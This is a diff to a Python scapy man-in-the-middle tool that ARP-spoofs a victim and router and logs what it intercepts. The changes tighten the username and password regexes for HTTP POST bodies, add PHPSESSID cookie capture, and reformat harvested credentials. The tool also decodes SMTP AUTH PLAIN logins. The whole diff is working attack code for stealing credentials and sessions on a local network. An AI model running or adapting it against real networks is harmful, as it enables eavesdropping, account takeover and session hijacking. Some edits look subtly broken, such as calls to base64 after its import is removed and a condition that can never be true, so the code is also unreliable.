@@ -1,18 +1,18 @@
 #!/usr/bin/python
 
+#from logging import getLogger
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 conf.verb=0
 #Below is necessary to receive a response to the DHCP packets because we're sending to 255.255.255.255 but receiving from the IP of the DHCP server
 conf.checkIPaddr=0
-import sys
+from sys import exit
 from threading import Thread
 import argparse
-import sys
-import os
+from os import geteuid, devnull
 import signal
-import base64
+from base64 import b64decode
 from subprocess import *
 
 #Create the arguments
@@ -44,6 +44,8 @@ oldack = None
 oldload = None
 oldurl = None
 oldhttp = None
+combined_load = None
+
 if args.write:
 	logger = open('interceptlog.txt', 'w+')
 
@@ -75,7 +77,7 @@ class Parser():
 			self.mailspy(pkt)
 
 	def URL(self, pkt):
-		global oldack, oldload, oldurl, oldhttp
+		global oldack, oldload, oldurl, oldhttp, combined_load
 
 		host = None
 		get = None
@@ -88,8 +90,8 @@ class Parser():
 		dport = pkt[TCP].dport
 		sport = pkt[TCP].sport
 		#If you see any other login variable names, tell me and I'll add em in here
-		user_regex = '(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&][^&]*))'
-		pw_regex = '(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))'
+		user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
+		pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&|;]*)'
 		try:
 			headers, body = pktload.split(r"\r\n\r\n")
 		except:
@@ -114,15 +116,23 @@ class Parser():
 		if host and post:
 			url = host+post
 
-		#Catch fragmented packet passwords, and FTP passwords
+		#Catch fragmented packet passwords, FTP passwords, cookies
 		if args.post:
 			#Catch fragmented packet passwords
 			if oldack == ack and oldload and oldhttp == 'post':
 				combined_load = oldload + pktload
-				print B+'[+] fragmented POST:',oldurl,'HTTP POST load:',body+W
+				if body != '':
+					print B+'[+] fragmented POST:',oldurl,'HTTP POST load:',body+W
+				else:
+					print B+'[+] fragmented POST:',oldurl,'HTTP POST load:',combined_load+W
 				username = re.findall(user_regex, combined_load)
 				password = re.findall(pw_regex, combined_load)
 				self.user_pass(username, password)
+				cookie = re.search('PHPSESSID=[^;|&]*', combined_load)
+				if cookie:
+					print R+'[+] Cookie found:',cookie.group()+W
+					if args.write:
+						logger.write('[+] Cookie found:'+cookie.group()+'\n')
 			#Catch FTP passwords
 			if dport == 21:
 				load = pktload.replace(r"\r\n", "")
@@ -165,19 +175,26 @@ class Parser():
 				if post:
 					if 'ocsp.' in url:
 						print B+'[+] POST:',url+W
-					else:
+					elif body != '':
 						print B+'[+] POST:',url,'HTTP POST load:',body+W
-					if body != '':
 						username = re.findall(user_regex, body)
 						password = re.findall(pw_regex, body)
 						self.user_pass(username, password)
+						cookie = re.search('PHPSESSID=[^;][^;]*', body)
+						if cookie:
+							print R+'[+] Cookie found:',cookie.group()+W
+							if args.write:
+								logger.write('[+] Cookie found:'+cookie.group()+'\n')
 					oldhttp = 'post'
 
-		oldload = pktload
+#		oldload = pktload
 		oldack = ack
 		oldurl = url
-		if not post:
+		if oldack != ack:
 			oldhttp = None
+			combined_load = None
+		else:
+			oldload = pktload
 
 	host = None
 	get = None
@@ -186,19 +203,15 @@ class Parser():
 
 	def user_pass(self, username, password):
 		if username:
-			for x in username:
-				for u in x:
-					if '=' in u:
-						print R+u+W
-						if args.write:
-							logger.write(u+'\n')
+			for u in username:
+				print R+'[+] Username found: '+u[1]+W
+				if args.write:
+					logger.write('[+] Username: '+u[1]+'\n')
 		if password:
-			for y in password:
-				for p in y:
-					if '=' in p:
-						print R+p+W
-						if args.write:
-							logger.write(p+'\n')
+			for p in password:
+				print R+'[+] Password: '+p[1]+W
+				if args.write:
+					logger.write('[+] Password: '+p[1]+'\n')
 
 	def mailspy(self, pkt):
 		dport = pkt[TCP].dport
@@ -308,21 +321,21 @@ class Parser():
 		if dport == 26:
 			try:
 				b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
-				b64decode = repr(base64.b64decode(b64str)).replace("'", "")
-				b64decode = b64decode.replace(r'\x00', ' ')
-				print R+'[!] Decoded:'+b64decode+W
+				decoded = repr(base64.b64decode(b64str)).replace("'", "")
+				decoded = decoded.replace(r'\x00', ' ')
+				print R+'[!] Decoded:'+decoded+W
 				if args.write:
-					logger.write('[!] Decoded: '+b64decode+'\n')
+					logger.write('[!] Decoded: '+decoded+'\n')
 			except:
 				pass
 		else:
 			try:
 				b64str = load.replace(r"\r\n", "")
-				b64decode = repr(base64.b64decode(b64str)).replace("'", "")
-				b64decode = b64decode.replace(r'\x00', ' ')
-				print R+'[!] Decoded:',b64decode+W
+				decoded = repr(base64.b64decode(b64str)).replace("'", "")
+				decoded = decoded.replace(r'\x00', ' ')
+				print R+'[!] Decoded:',decoded+W
 				if args.write:
-					logger.write('[!] Decoded: '+b64decode+'\n')
+					logger.write('[!] Decoded: '+decoded+'\n')
 			except:
 				pass
 
@@ -402,10 +415,10 @@ def main():
 	global victimMAC, victimIP
 
 	#Check if root
-	if not os.geteuid()==0:
-		sys.exit("\nPlease run as root\n")
+	if not geteuid()==0:
+		exit("\nPlease run as root\n")
 
-	DN = open(os.devnull, 'w')
+	DN = open(devnull, 'w')
 
 	if args.ipaddress:
 		victimIP = args.ipaddress
@@ -464,19 +477,19 @@ def main():
 		routerMAC = Spoof().originalMAC(routerIP)
 		print "[+] Router MAC: " + routerMAC
 	except:
-		sys.exit("[!] Could not get router MAC address")
+		exit("[!] Could not get router MAC address")
 	try:
 		victimMAC = Spoof().originalMAC(victimIP)
 		print "[+] Victim MAC: " + victimMAC
 	except:
-		sys.exit("[!] Could not get victim MAC address")
+		exit("[!] Could not get victim MAC address")
 	if not dnsIP == routerIP:
 		try:
 			dnsMAC = Spoof().originalMAC(dnsIP)
 			print "[+] DNS server MAC: " + dnsMAC
 		except:
 			print "[!] Could not get DNS server MAC address"
-			sys.exit("[!] Could not get victim MAC address")
+			exit("[!] Could not get victim MAC address")
 
 	ip_flush_forward(DN)
 
@@ -498,7 +511,7 @@ def main():
 		Popen(['iptables', '-t', 'nat', '-X'], stdout=PIPE, stderr=DN)
 		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
 		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
-		sys.exit(0)
+		exit(0)
 	signal.signal(signal.SIGINT, signal_handler)
 
 
